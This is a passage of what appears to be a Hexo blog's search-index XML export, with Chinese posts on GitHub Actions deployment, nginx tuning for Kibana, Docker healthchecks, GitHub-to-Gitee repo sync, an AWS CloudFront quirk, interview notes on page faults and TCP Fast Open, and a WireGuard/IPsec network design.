        <tag>adb</tag>
        <tag>Redmi_K40</tag>
        <tag>Poco_F3</tag>
        <tag>fastboot</tag>
        <tag>XiaoMiToolV2</tag>
        <tag>bootloader</tag>
        <tag>unlock</tag>
      </tags>
  </entry>
  <entry>
    <title>How to auto deploy Hexo site to GitHub pages via Github Actions</title>
    <url>/2019/10/hexo-github_action-github_pages/index.html</url>
    <content><![CDATA[缘起业界良心的谷歌云（gcp）让我给玩儿坏了呀，原本这一期还没结束（应该到年底），可我的 300 刀的免费额度一个月前就已经花光了，于是乎，我的服务被停掉了。数据都没能机会拉取下来。
这样的话，给我自己折腾了进二十年的博客一个新的归宿又马上变成了火烧眉毛的事情了，早先其实一直在关注 GitHub Actions，而且也早就有申请，所以就乘着这个机会，把博客源文件、网站（静态内容）全都放在 GitHub（GitHtb Pages 服务） 上吧，同时还顺带用一下 GitHub Actions 来做自动构建、部署。


具体步骤本地部署到 GitHub Pages这一步要达到的目标就是：

本地能写文章
并能 deploy 到 GitHub 上去（需要关注 hexo deploy github 这个的配置方法）
[username].github.io 下能访问到

GitHub Pages
登录 GitHub
新建一个 “Repository name” 叫 [username].github.io 的 repository
“[username]” 为你 GitHub 的帐号，我的例子中，叫：haw-haw.github.io
权限设置为：Public



本地 hexo
本地需要安装配置好 nodejs、hexo、相关 theme，还有一些插件，等等，都要弄好
还要配置好能用 git push 东西到 GitHub 上自己的 repository 里，这步如果不会，请自行去查文档

总之，要做到
hexo -d 
能把
hexo -g 
生成的静态内容部署到 GitHub Pages 上去
准备部署密钥对本地上执行：
ssh-keygen -t rsa -b 4096 -C &quot;haw-haw@users.noreply.github.com&quot; -f ~/.ssh/github-actions-deploy;# 这里的 &quot;haw-haw&quot; 替换成你自己在 GitHub 上的帐号名# 执行这个命令以后，本地 ~/.ssh/ 目录下会有两个文件：github-actions-deploy 和 github-actions-deploy.pub# 分别是用来 deploy 时用的公私钥密钥对。这个在后面会用到

源代码私仓 hexo在 GitHub 上建一个新的 repository

Repository name 任取（这里假设是 hexo）
权限为 Private 的 repository
不要选中 “Initialize this repository with a README”
不要 Add .gitignore
不要 Add a license

本地源代码提交到 hexo
克隆空私仓：hexo 到本地
将源文件目录下的内容有选择的添加到私仓 hexo 的本地目录下
public 目录不要（因为构建时会生成 public 目录下的东西）
node_modules 目录不要（因为在准备构建环境时会自动安装这些需要的模块的）


将准备好的源代码目录内容推送到 hexo 私仓

配置好部署密钥对私钥到 hexo叫 “hexo” 的私仓建好以后，点进去，点击 Settings–&gt;Secrets–&gt;”Add a new secret”

在 Name 框里填入：GH_ACTION_DEPLOY_KEY
在 Value 框里填入本地文件 ~&#x2F;.ssh&#x2F;github-actions-deploy 的内容（注意：是文件内容！）

公钥到 haw-haw.github.io进入名为 “haw-haw.github.io”(用你的用户名来取代 “haw-haw”) 的 Repository

点击 Settings–&gt;”Deploy keys”–&gt;”Add deploy key”
Title 随意填
Key 框里填本地文件 ~&#x2F;.ssh&#x2F;github-actions-deploy.pub（注意：带 “.pub”） 的内容

GitHub Actions在 hexo 私仓下新建文件：.github&#x2F;workflows&#x2F;hexo.yml（目录不存在的话自己建），内容如下：
name: Main workflowon:  push:    branches:    - masterjobs:  build:    runs-on: ubuntu-18.04    steps:    - uses: actions/checkout@v1    - name: Use Node.js 10.x      uses: actions/setup-node@v1      with:        node-version: &#x27;10.x&#x27;    - name: prepare build env      env:        GH_ACTION_DEPLOY_KEY: $&#123;&#123;secrets.GH_ACTION_DEPLOY_KEY&#125;&#125;        NEXT_VERSION: v7.3.0      run: |        mkdir -p ~/.ssh/        echo &quot;$GH_ACTION_DEPLOY_KEY&quot; | tr -d &#x27;\r&#x27; &gt; ~/.ssh/id_rsa        chmod 600 ~/.ssh/id_rsa        ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts        git config --global user.name &#x27;haw-haw&#x27;        git config --global user.email &#x27;haw-haw@users.noreply.github.com&#x27;        npm i -g hexo-cli        npm i    - name: deploy to github      run: |        hexo generate &amp;&amp; hexo deploy

以上就是我正在用的配置，其实基本上都是来自于 GitHub 官方的 node 的 workflow 的配置，所以具体也没什么细讲的，这里只提一个点：
tr -d &#x27;\r&#x27; &gt; ~/.ssh/id_rsa;

上面这一句，如果是你在部署是碰到 id_rsa 的文件格式错误的问题，那么这一句就是解决这个问题的。
常规使用方法本地使用
clone 私仓 hexo 到本地
本地在目录 source&#x2F;_posts&#x2F; 下编辑新的文件
提交到本地
push 到远端（GitHub 私仓 hexo 的 master 分支），触发构建、部署

在线使用在 web 端进入私仓 hexo 的 master 分支的 source&#x2F;_posts&#x2F; 目录下新建文件并编辑，完成后 commit，触发构建部署（这种方式不推荐，因为也许会太频繁的触发构建）
进阶推荐使用方法新开一个分支：draft，然后再在这个分支上做操作（修改也好、新建也好），无论是本地，还是在线，都不会触发构建（因为 GitHub Action 只在 master 下才有效），修改新建文章完毕，再 merge 到 master 分支，进而会触发 GitHub Action 自动构建、部署。
定制域名如果你在 GitHub Pages 上是使用的自定义域名，而不是像我这样 haw-haw.github.io 的域名（实际上我也是自定义的域名：），那么你需要在 hexo 的 master 分支的 source&#x2F; 放一个叫 CNAME 的文件，里面写上你的自定义域名，比如我的：ming.theyan.gs。否则，每次部署，你的自定义域名配置都会被清掉！
限制
GitHub Actions 目前还是 beta 状态，使用也还需要申请
对于私仓，GitHub Actions 超过每月 2000 分钟的时间是要收费的。  我现在不到 40 篇文章，每次构建一分钟出头，如果按两分钟算，一个月可以构建 1000 次，每天可以构建 33 次，感觉怎么都够了。

]]></content>
      <tags>
        <tag>Hexo</tag>
        <tag>GitHub Actions</tag>
        <tag>GitHub Pages</tag>
        <tag>nodejs</tag>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title>how to tune Nginx acted as reverse proxy for Kibana</title>
    <url>/2019/04/how-to-tune-Nginx-acted-as-reverse-proxy-for-Kibana/index.html</url>
    <content><![CDATA[缘起老套路，公司在用 AWS 上的 Elasticsearch 服务，连带的就有一个 Kibana，按照官方的说法，Kibana 这块的密码保护，可以用 AWS 的 Cognito 服务来做，或者是用前置 Nginx 反向代理的方法来做。


但是，AWS 大中国区并没有 Cognito 服务，所以，没得选，只能采用在 Kibana 前置 Nginx 反向代理的方法来实现简单权限控制了。
过程官方有两篇文章（ https://aws.amazon.com/premiumsupport/knowledge-center/kibana-outside-vpc-nginx-elasticsearch/ 和 https://docs.aws.amazon.com/en_us/elasticsearch-service/latest/developerguide/es-kibana.html#es-kibana-proxy ）涉及到了这种情况下怎么配置 Nginx，于是，我的配置文件的第一版几乎完全来自于这个配置的适当修改。
发现问题最早发现问题是在我司办公室的网络环境下，感觉首先进入的那个页面非常慢，然后，刷新 15 分钟数据偶尔也会感觉有些慢，婶婶可忍叔叔不可忍，于是打开浏览器的各种 develop tools 来看下，发现更新数据是抓的一个 .json 的文件，有四兆多，于是考虑能否在 Nginx 端启用压缩呢？
初步解决于是否，就在 Nginx 处打开了 gzip 压缩，当然尤其要在压缩的文件类型中指定上面发现的 .json 文件的 mime 类型：application&#x2F;json。重启 Nginx，再次再刷新数据的时候，发现只传输了几百 K，速度快多了。
进一步解决前面有提到，除了刷新数据慢，还有一个首页进入非常慢，接着就要解决这个非常慢的问题。同样用 develope tools 抓包看，发现首页进入的时候需要加载三个非常大的 .js 文件（十几兆的 vendors.bundle.dll.js 以及几兆的 commons.bundle.js 和 kibana.bundle.js），于是乎，在 Nginx 启用压缩的 mime 类型中加入 .js 文件的 mime 类型，重启 Nginx。再次刷新首页，发现秒入。又一个问题解决了。
还可以尝试前面看到，导致慢的原因无非是几个大家伙要下载导致的，启用服务器端压缩固然能减少数据传输量来起到优化用户体验的目的，但是，如果我们启用缓存是不是更能起到优化的效果呢？要知道， .js 可很有可能是静态文件，非常适用于缓存。
但是这一步我最终没有这样去做，原因有三：

我并不能百分百保证这三个 .js 文件不是动态生成的（毕竟现在有很多“伪静态”的东西）
我并没有更多的时间
目前的效果已经到了可以接受的程度了

所以这一步就留到以后有时间的时候研究吧
附上 Nginx 配置server &#123;    listen       80;    add_header	Proxy_Server	$hostname	always;    server_name  kibana.xxxxxx.com;    root         /usr/share/nginx/html;    client_header_buffer_size 64k;    large_client_header_buffers 4 64k;    satisfy any;    allow 127.0.0.0/8;    allow 172.16.0.0/12;    allow 192.168.0.0/16;    deny  all;    auth_basic  &quot;Kibana Auth&quot;;    auth_basic_user_file /etc/nginx/.pasd_kibana;    resolver 10.1.1.2;  # Fix nginx resolving url only on config load (AWS can change the endpoint IP at anytime)  # by using a variable, it forces nginx to resolve the resolver above.    gzip on;    gzip_buffers        16 8k;    gzip_comp_level     4;    gzip_http_version   1.0;    gzip_min_length     1280;    gzip_types          text/plain text/css text/xml application/x-javascript application/xml application/xml+rss application/json application/javascript text/*;    gzip_vary           on;    set $proxy_pass_url vpc-xxxxxxxxxxxx-xxxxxxxxxxxxxxxxxx.cn-northwest-1.es.amazonaws.com.cn;    location = / &#123;        return 301 /_plugin/kibana/;    &#125;    location /_plugin/kibana/ &#123;        proxy_set_header X-Real-IP $remote_addr;        proxy_http_version 1.1;        proxy_set_header Connection &quot;Keep-Alive&quot;;        proxy_set_header Proxy-Connection &quot;Keep-Alive&quot;;        proxy_set_header Authorization &quot;&quot;;        proxy_pass_request_headers      off;        proxy_set_header kbn-xsrf &quot;kibana&quot;;        proxy_hide_header content-security-policy;        proxy_pass https://$proxy_pass_url;        proxy_buffer_size 128k;        proxy_buffers 4 256k;        proxy_busy_buffers_size 256k;    &#125;&#125;
]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>AWS</tag>
        <tag>Elasticsearch</tag>
        <tag>Kibana</tag>
      </tags>
  </entry>
  <entry>
    <title>something about healthech for docker container</title>
    <url>/2024/09/something%20about%20healthcheck%20for%20Docker%20container/index.html</url>
    <content><![CDATA[在 Docker compose 文件里使用健康检查的方案变迁。背景：小厂，用不起 kubernetes，只能自己生写 docker compose 来部署 Docker 容器。以下以一个在容器里监听 tcp 端口 8090 的服务为例来描述一下我用到过的健康检查的方案的变迁。


curl文档里都讲是
# docker compose filehealthcheck:    test: [&quot;CMD-SHELL&quot;, &quot;curl -f http://localhost:8090/ || exit 1&quot;]    interval: 30s    timeout: 3s    retries: 3    start_period: 10s

这种方式，但是实际上，我经手的大多 image，都没有统一的健康检查 url，这样直接访问，很有可能出各种结果，返回的 return code 不是 200 的结果，这样的话，这个健康检查会过不去，但是服务却是好的。所以，经过研究，发现更好的应该是：
# docker compose filehealthcheck:    test: [&quot;CMD-SHELL&quot;, &quot;curl -s -o /dev/null http://localhost:8090/ || exit 1&quot;]    interval: 30s    timeout: 3s    retries: 3    start_period: 10s

当然，这个解决不了一个致命问题：好些个基础 image，都不带命令 curl，然后我就开始了尝试下一个方案。
&#x2F;proc&#x2F;net&#x2F;tcp服务绑定监听端口，肯定会更新 /proc/net/tcp 这个文件，只不过端口号得转换成十六进制。就像这样：
# Docker compose filehealthcheck:    # Check that entries for ports 8000 exist in the /proc/net/tcp file. Port 8000 is represented as :1F40.    test: [&quot;CMD-SHELL&quot;, &quot;sleep 2 &amp;&amp; grep &#x27;:1F40&#x27; /proc/net/tcp&quot;]    interval: 30s    timeout: 5s    retries: 3    start_period: 30s

一直工作挺好，直到某一天我遇到一个基于 openjdk:8u342 的 Docker image，跑着 java 的程序，这个 java 程序监听着端口 8090，明明工作正常，但是健康检查却过不去，进到容器里一看，/proc/net/tcp 文件里的确没有 “:1f9a”（printf &quot;%x\n&quot; 8090）！
非常诡异！一顿好查。
apt update &amp;&amp; apt install -y iproute2 procps
然后：
ss -nalpt
发现有

*:8090

但是 /proc/net/tcp 里始终没有 “:1f9a”，最后偶然间发现文件 /proc/net/tcp6，打开看：

0: 00000000000000000000000000000000:1F9A 00000000000000000000000000000000:0000 0A 00000000:00000000

“:1F9A” 赫然在这里！
回头找原因，只能认为是 java 程序绑定监听端口时优先绑了 IPv6 的地址，但是由于 kernel 参数：net.ipv6.bindv6only=0 （缺省就是这样），从而绑在 IPv6 地址上的端口，在 IPv4 的地址上也能访问。
好吧，/proc/net/tcp 方案不是不行了，而是还要考虑到文件 /proc/net/tcp6
&#x2F;dev&#x2F;tcp&#x2F;{hostname}&#x2F;{port}# Docker compose filehealthcheck:    test: [&quot;CMD-SHELL&quot;, &quot;echo &gt; /dev/tcp/localhost/8090 || exit 1&quot;]    interval: 30s    timeout: 3s    retries: 3    start_period: 10s

这个方案就有一个缺点：bash 可用但 sh 下不可用
]]></content>
      <tags>
        <tag>docker-compose</tag>
        <tag>healthcheck</tag>
        <tag>curl</tag>
        <tag>ss</tag>
      </tags>
  </entry>
  <entry>
    <title>support alibaba cloud in draw.io</title>
    <url>/2020/11/support%20alibaba%20cloud%20in%20draw.io/index.html</url>
    <content><![CDATA[背景最近几年一直在用 draw.io 来画一些工作中的架构图之类的各种图，这个工具对于 AWS、azure 甚至于 GCP 都支持，但惟独就是还不支持阿里云，而工作中有几家公司偏偏就是用的阿里云，其实也可以用 AWS 之类的图标来画，但强迫症让我必须用阿里云自己的图标。于是就有了本篇内容。


方法先把成果发出来，地址在这里
把这个下载下来，解压到某一个特定的地方，然后在 draw.io 里将解压出来的文件 import 进去就可以了。
注意：解压出来的文件可不能被删除或移动。
]]></content>
      <tags>
        <tag>draw.io</tag>
        <tag>阿里云</tag>
        <tag>alibaba cloud</tag>
        <tag>aliyun</tag>
      </tags>
  </entry>
  <entry>
    <title>sync repo from Github to Gitee using github action</title>
    <url>/2021/12/sync_repo_from_github_to_gitee_using_github_action/index.html</url>
    <content><![CDATA[缘起早年在 github 上做了个 repo 用作图床，但是由于种种原因，大陆访问 github.com 的速度感人，故而想把（图床）数据在大陆的 gitee.com 上也同步一份，然后用 gitee.com 上的图床来给大家访问。


网上搜了下，有用 gitee 的“镜像仓库”的功能的，但这个功能需要申请开通，直接否掉。然后其他基本都是用 github action 来实现，这个我也是认同的。不过好多人都是直接用的别人做好的项目来实现的，由于我一是觉得这个东西不复杂没必要用别人封装好的东西（因为他封装好的好些东西我不一定需要），再个感觉虽然别人也开源但我也没那闲功夫整天 review 别人的代码，所以我就想不用别人现成的东西，自己整。
具体方案准备公私钥一对没有的话可以生成：
ssh-keygen -t ed25519 -f id_ed25519_github2gitee -C &quot;for sync from github to gitee&quot;;# 按两次回车键以输入空的 passphrase# 私钥在 id_ed25519_github2gitee 里# 公钥在 id_ed25519_github2gitee.pub 里

github 账号及图床仓库这里假设是 xxxxgithub 和 imagehostgithub
gitee 测
新建账号（假设是：xxxxgitee）
新建仓库（假设是：imagehostgitee）
上传公钥（https://gitee.com/profile/sshkeys）

github 测上传私钥在 Settings-&gt;Secrets 配置一个叫 GITEE_PRIVATE_KEY 的 Repository secrets，内容就是前面准备的私钥（文件 id_ed25519_github2gitee 里）
配置 github action新建文件 .github&#x2F;workflows&#x2F;sync2gitee.yml，内容如下：
name: sync2giteeon:  push:    branches:      - masterjobs:  repo-sync:    runs-on: ubuntu-latest    steps:      - uses: actions/checkout@v2        with:          persist-credentials: false            - name: sync github -&gt; gitee        env:          SSH_KEY: $&#123;&#123; secrets.GITEE_PRIVATE_KEY &#125;&#125;          GITHUB_REPO: &quot;https://github.com/xxxxgithub/imagehostgithub.git&quot;          GITEE_REPO: &quot;git@gitee.com:xxxxgitee/imagehostgitee.git&quot;        run: |          mkdir -p ~/.ssh/          echo &quot;$SSH_KEY&quot; | tr -d &#x27;\r&#x27; &gt; ~/.ssh/id_rsa          chmod 600 ~/.ssh/id_rsa          ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts          ssh-keyscan gitee.com &gt;&gt; ~/.ssh/known_hosts          git config --global user.name &quot;xxxxgitee&quot;                    git clone --mirror &quot;$GITHUB_REPO&quot; &amp;&amp; cd `basename &quot;$GITHUB_REPO&quot;`          git remote set-url --push origin &quot;$GITEE_REPO&quot;          git fetch -p origin          git for-each-ref --format &#x27;delete %(refname)&#x27; refs/pull | git update-ref --stdin          git push --mirror

保存，提交，就应该会触发同步。在 github 里 repo 下的 Actions 里可以看下结果
]]></content>
      <tags>
        <tag>github</tag>
        <tag>gitee</tag>
        <tag>repository</tag>
        <tag>sync</tag>
        <tag>同步</tag>
        <tag>图床</tag>
        <tag>action</tag>
      </tags>
  </entry>
  <entry>
    <title>AWS cloudfront 的一个小 bug</title>
    <url>/2024/07/the%20bug%20of%20cloudfront/index.html</url>
    <content><![CDATA[缘起我厂有一个网站（域名 a.b.com 和 a1.b.com），原来是跑在自己 IDC 里的机器上的，用 Docker 容器跑的，容器里就一个 nginx，放了一堆的静态资源。
为了“用户体验”，这两个域名都上了 CDN（AWS 的 cloudfront），源站分别是：

a.ori.b.com
a1.ori.b.com

最近做了一次架构调整，把这个服务迁移到了 AWS 的 EC2 上，而且将这个服务放在了一个 ALB 的后面，这个 ALB 是启用了 cloudfront 集成的，所以，我在 route 53 上就把这两个域名都解析到了 ALB 集成的这个 cloudfront distribution 的域名上了。

然后，发现问题了。a.b.com 工作符合预期而 a1.b.com 老是返回 502 错误，而且是 cloudfront 直接返回的。
排查过程这里就不细说了
结论当你要把一个域名由传统 cloudfront 上迁移到 ALB 集成的 cloudfront 的时候，你多半要小心了，如果你忘了把之前的 cloudfront distribution 的话，迁移可能会达不到你预期的效果的。也就是说，这个域名在 cloudfront 上还是会走之前的配置！哪怕你的域名已经正确指向了 ALB 集成的 cloudfront distribution.
多说几句我上面的这个例子里，其实最早两个域名都是有问题的，但为什么有一个没有暴露出来呢，那是因为每暴露出来的这个，之前的 cloudfront distribution 到源站什么都是好的，所以他走原来的配置也没问题，但另外一个由于源站的域名指向被删除，所以原配置就无法工作了，才暴露出问题的。
]]></content>
      <tags>
        <tag>aws</tag>
        <tag>cloudfront</tag>
        <tag>ALB</tag>
      </tags>
  </entry>
  <entry>
    <title>xx公司面试总结（查漏补缺）</title>
    <url>/2019/02/xx%E5%85%AC%E5%8F%B8%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93%EF%BC%88%E6%9F%A5%E6%BC%8F%E8%A1%A5%E7%BC%BA%EF%BC%89/index.html</url>
    <content><![CDATA[缘起今天下午面了一家特别想去的公司，结果聊很多，但是……折了，不要问我为什么知道的，面试完本来说别的同事（一般会是 HR）再聊一下但结果是前台来直接送走这不是凉了是什么？
主要原因我想是：

人家本来要求就高
我有几个技术点答的不好

我想，折了就折了吧，我只能看能不能变废为宝，从中学到点什么，吸取什么教训什么的，于是就有了本篇面试总结。


心得关于形而上形而上，或者是高大上、高逼格的东西，面试中如果能适当的、不生硬的引出来，肯定是有加分的，尤其是对那些高大上的岗位（管理岗、架构师啥的），所以，这个要靠平时自己多准备。貌似我对这个没有天赋
知识点面试期间，大概有三个技术点我是没答对或者没描述明白的。具体情况如下：
Page fault以下来自维基百科

页缺失（英语：Page fault，又名硬错误、硬中断、分页错误、寻页缺失、缺页中断、页故障等）指的是当软件试图访问已映射在虚拟地址空间中，但是当前并未被加载在物理内存中的一个分页时，由中央处理器的内存管理单元所发出的中断。


通常情况下，用于处理此中断的程序是操作系统的一部分。如果操作系统判断此次访问是有效的，那么操作系统会尝试将相关的分页从硬盘上的虚拟内存文件中调入内存。而如果访问是不被允许的，那么操作系统通常会结束相关的进程。


虽然其名为“页缺失”错误，但实际上这并不一定是一种错误。而且这一机制对于利用虚拟内存来增加程序可用内存空间的操作系统（比如Microsoft Windows和各种类Unix系统）中都是常见且有必要的。

我理解其实 Page fault 就是当进程访问虚拟内存中的某个不在物理内存里的内存页的时候，CPU 的 MMU 发出的一个中断。
如果访问时合法的，所需的内存页会被交换进物理内存。
Page fault 的分类软性以下内容来自于维基百科

软性页缺失指页缺失发生时，相关的页已经被加载进内存，但是没有向MMU注册的情况。操作系统只需要在MMU中注册相关页对应的物理地址即可。


发生这种情况的可能性之一，是一块物理内存被两个或多个程序共享，操作系统已经为其中的一个装载并注册了相应的页，但是没有为另一个程序注册。


可能性之二，是该页已被从CPU的工作集中移除，但是尚未被交换到磁盘上。比如OpenVMS这样的使用次级页缓存的系统，就有可能会在工作集过大的情况下，将某页从工作集中去除，但是不写入硬盘也不擦除（比如说这一页被读出硬盘后没被修改过），只是放入空闲页表。除非有其他程序需要，导致这一页被分配出去了，不然这一页的内容不会被修改。当原程序再次需要该页内的数据时，如果这一页确实没有被分配出去，那么系统只需要重新为该页在MMU内注册映射即可。

硬性以下内容来自于维基百科

与软性页缺失相反，硬性页缺失是指相关的页在页缺失发生时未被加载进内存的情况。这时操作系统需要：



寻找到一个空闲的页。或者把另外一个使用中的页写到磁盘上（如果其在最后一次写入后发生了变化的话），并注销在 MMU 内的记录
将数据读入被选定的页
向 MMU 注册该页



硬性页缺失导致的性能损失是很大的。以一块 7200rpm 的主流机械硬盘为例，其平均寻道时间为 8.5 毫秒，读入内存需要 0.05 毫秒。相对的，DDR3 内存的访问延迟通常在数十到 100 纳秒之间，性能差距可能会达到 8 万到 22 万倍。


另外，有些操作系统会将程序的一部分延迟到需要使用的时候再加载入内存执行，以此来提升性能。这一特性也是通过捕获硬性页缺失达到的。


当硬性页缺失过于频繁的发生时，称发生系统颠簸（Thrashing）。

无效以下内容来自于维基百科

当程序访问的虚拟地址是不存在于虚拟地址空间内的时候，则发生无效页缺失。一般来说这是个软件问题，但是也不排除硬件可能，比如因为内存故障而损坏了一个正确的指针。


具体动作与所使用的操作系统有关，比如 Windows 会使用异常机制向程序报告，而类 Unix 系统则会使用信号机制。如果程序未处理相关问题，那么操作系统会执行默认处理方式，通常是转储内存、终止相关的程序，然后向用户报告。

貌似这才是真正的“错误”。
TCP Fast Open以下内容来自于维基百科

TCP 快速打开（英语：TCP Fast Open，简称 TFO ）是对计算机网络中传输控制协议（TCP）连接的一种简化握手手续的拓展，用于提高两端点间连接的打开速度。


它通过握手开始时的 SYN 包中的 TFO cookie（一个 TCP 选项）来验证一个之前连接过的客户端。如果验证成功，它可以在三次握手最终的 ACK 包收到之前就开始发送数据，这样便跳过了一个绕路的行为，更在传输开始时就降低了延迟。这个加密的 Cookie 被存储在客户端，在一开始的连接时被设定好。然后每当客户端连接时，这个 Cookie 被重复返回。


此 Cookie 通常采用一种分组密码，私钥由服务器根据客户端的IP地址保存，生成一个第三方难以仿冒的消息认证码标签，即便第三方可以伪造源IP地址或从其他IP地址制造到同一个服务器的连接。尽管使用了加密技术来生成cookie，但 TFO 并不着眼于提供比它所替换的三次握手有更多的安全性，并且不对所产生的 TCP 连接提供任何形式的加密保护或端点身份认证。它的目的不是为了抵挡中间人攻击。


这个协议最早提出于 2011 年并在 2012 年 2 月时已为一个 IETF 互联网草案，这项规范最终在 2014 年 12 月作为RFC 7413 发布。

TFO 的具体过程以下内容来自于维基百科
请求Fast Open Cookie

客户端发送 SYN 数据包，该数据包包含 Fast Open 选项，且该选项的 Cookie 为空，这表明客户端请求 Fast Open Cookie；
支持 TCP Fast Open 的服务器生成 Cookie，并将其置于 SYN-ACK 数据包中的 Fast Open 选项以发回客户端；
客户端收到 SYN-ACK 后，缓存 Fast Open 选项中的 Cookie。


实施TCP Fast Open
以下描述假定客户端在此前的 TCP 连接中已完成请求 Fast Open Cookie 的过程并存有有效的 Fast Open Cookie。


客户端发送 SYN 数据包，该数据包包含数据（对于非 TFO 的普通 TCP 握手过程，SYN 数据包中不包含数据）以及此前记录的 Cookie；支持 TCP Fast Open 的服务器会对收到 Cookie 进行校验：如果 Cookie 有效，服务器将在 SYN-ACK 数据包中对 SYN和数据进行确认（Acknowledgement），服务器随后将数据递送至相应的应用程序；否则，服务器将丢弃 SYN 数据包中包含的数据，且其随后发出的 SYN-ACK 数据包将仅确认（Acknowledgement）SYN 的对应序列号；如果服务器接受了 SYN 数据包中的数据，服务器可在握手完成之前发送数据；客户端将发送 ACK 确认服务器发回的 SYN 以及数据，但如果客户端在初始的 SYN 数据包中发送的数据未被确认，则客户端将重新发送数据；此后的 TCP 连接和非 TFO 的正常情况一致。注：客户端在请求并存储了 Fast Open Cookie 之后，可以不断重复 TCP Fast Open 直至服务器认为 Cookie 无效（通常为过期）。

Docker 的网络模型这里聊到的其实是指我在前公司用过的一个简单的 Docker 应用的网络模型，非常简单，就是桥接。
]]></content>
      <tags>
        <tag>Docker</tag>
        <tag>面试总结</tag>
        <tag>TFO</tag>
        <tag>Page fault</tag>
        <tag>TCP Fast Open</tag>
      </tags>
  </entry>
  <entry>
    <title>《贝佐斯的数字帝国》读后感</title>
    <url>/2021/04/%E3%80%8A%E8%B4%9D%E4%BD%90%E6%96%AF%E7%9A%84%E6%95%B0%E5%AD%97%E5%B8%9D%E5%9B%BD%E3%80%8B%E8%AF%BB%E5%90%8E%E6%84%9F/index.html</url>
    <content><![CDATA[水一篇哈，这里从来没写过读后感，这次水一篇吧。:(
入职这家公司就知道有这么一篇文章要写，一直忙忙碌碌、忙东忙西也没来得及张罗这事。最近（双十一热身），乘着搞活动（满 200 减 100），把这本书买了。
看起来自然很快，一个多礼拜就看完了。
看完了有啥想法？没啥想法。：）


我九八年入行就是做网上书店，对标的就是 Amazon 的网上书城（那会儿也仅是网上书城）。到现在，手头维护的公司的计算网络资源，都在 AWS（amazon web service） 上（之前也有好多家前东家都在用 AWS），而且，我还知道 Amazon 在硅谷互联网企业中出了名的“抠门”，所以说，我对 Amazon 的了解不可谓不深，但是看了这本书，我发现我其实自始至终，都没有能真正了解这家公司。
书看得很快，有印象的地方不多，如果说真要有，那么如下几点还是给了我比较深刻的印象的。
一，不写 ppt。为啥对这个印象深刻？因为这个深得我心呀。我是个技术人员，我对 ppt 从来感觉就不好。看过也听过那么多的 ppt，绝大多数是结束之后完全不知所云，好像讲了很多但又好像什么都没讲。
二，串联式审批改成并联式。这个我也很赞同呀。所谓大公司病之一，就是流程繁琐缓慢，这也是官僚主义的一种表现嘛。减少层次、简化审批流程，对员工肯定是好消息。
三，职能部门不能说不（There is no “NO”.）。这句话给我震动很大，在以往所有呆过的公司里，运维团队的角色无非两种，其中大多数情况下都是被定义为职能部门、基础支持团队（另外一种定位就不讲了）。但我从来没有听说过这种说法：“职能部门不能说“不””？所以第一次听到这种说法，我被震撼了。但细细品，是有道理的，职能部门就是搞好服务的，服务好支持的对象的。有了这个意识，我发现我对鄙厂商务团队的复杂的“科学上网”需求突然感觉需要认真对待了。：）
]]></content>
      <tags>
        <tag>读后感</tag>
        <tag>贝佐斯</tag>
        <tag>亚马逊</tag>
        <tag>Amazon</tag>
      </tags>
  </entry>
  <entry>
    <title>中小企业多 IDC 之间的内网打通方案</title>
    <url>/2022/08/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E5%A4%9A%20IDC%20%E4%B9%8B%E9%97%B4%E7%9A%84%E5%86%85%E7%BD%91%E6%89%93%E9%80%9A%E6%96%B9%E6%A1%88/index.html</url>
    <content><![CDATA[缘起这个问题我觉得中小公司有需求，但是大公司应该没这个需求，大公司肯定都找第三方直接 MPLS 之类的商业全套解决方案了。但是对于缺钱的中小企业，我觉得还是有借鉴意义的。


这篇文章本来是要讲“中小企业维护海外服务器的 VPN 方案”的，但讲着讲着，发现大部分内容，都是讲的“内网打通”。:(
这个方案准确讲是来自我在某个前司（前司比较多：）的一段工作经历，他们业务跑在海外公有云（AWS）上，技术团队在国内，连服务器需要先拨 VPN，直接拨经常断，所以我就折腾了这么一个方案出来，我在那里的一年多时间，完全没有出过问题。
方案细节方案概况正所谓：一图胜千文。所以，请看图：

注意：这里为了脱敏，我把一些真正的公网 IP 地址和公司产品的名字以及一些我认为是隐私的信息隐去了。
另外，上图其实可以和我的另外一篇文章：怎样在 checkpoint 设备和 AWS 北京的 EC2 之间搭建 IPsec 隧道 结合起来看。
所以，这个图其实是个“内网打通”的示意图。
关键点海外节点之间的（内网）互联各大公有云厂商，都有成熟的产品来处理内部的各个 VPC 之间的内网互通，比如如上图所示，aws 的相关产品，就叫 “transit gateway”，阿里云也有类似的产品，好像叫“云企业网”还是什么别的。Azure 和 GCP 就不太了解，但肯定有类似产品。
所以，这个问题的答案就是：

如果是厂商内部，直接使用厂商的产品即可。跨账号的 VPC 之间也支持（内网打通）哟，但是要注意内网 IP 别冲突了
如果是厂商之间、或者是厂商和自建 IDC 之间，那么推荐用 WireGuard 打通即可。

国内节点之间的（内网）互联答案其实跟海外的一样：

厂商内部，直接用厂商的产品
跨厂商或跟 IDC 之间，用 WireGuard

当然，这里也有例外，比如上图所示：北京 office 和 AWS 北京节点之间，就是用 IPSec 而不是 WireGuard 打通的（具体怎么打通，前面有提到的一篇文章中有详细记载）。为什么这样呢？那主要是因为公司给北京办公室配置了设备呀，checkpoint 的防火墙！这货不支持 WireGuard。故而只能在 AWS 北京节点起台 ec2，装个 IPSec 服务，然后两者打通。
方案的“缺点”这个方案就是路由表的维护需要仔细又仔细。其实并不难，主要是复杂，需要细心，维护时尽量对着图来做，配完多做测试。
补充一下 VPN 接入方案前面有提到这个方案也可以用做 VPN 优化的。首先我们看看优化之前我们的 VPN 架构是怎么样的。
之前，VPN server 都是在海外的公有云节点上，国内连一个是慢，而最重要的是不稳定，非常容易被封。
而（内网打通）之后，我的 VPN 方案我推荐其主要接入点放在国内同一家厂商据用户最近的接入点（如上图例就是 aws 北京接入点，再准确点就是 IPSec 那台 EC2），然后再在海外每个节点保留一个冗余接入点即可。注意：这些 VPN 接入点的认证都是统一的。
这样一来从（VPN）主接入点来说，用户从国内（大概率是从北京）连过来，不容易被干扰，大概率不会被封，而同一厂商国内节点到海外节点之间数据链路也会比较稳定通畅，也不容易被干扰、被封。所以，整条链路不一定有多快，但肯定是要稳定的多得多得多。
方案的局限性节点维护的复杂性想想如果新加入一个节点，会需要做哪些操作。
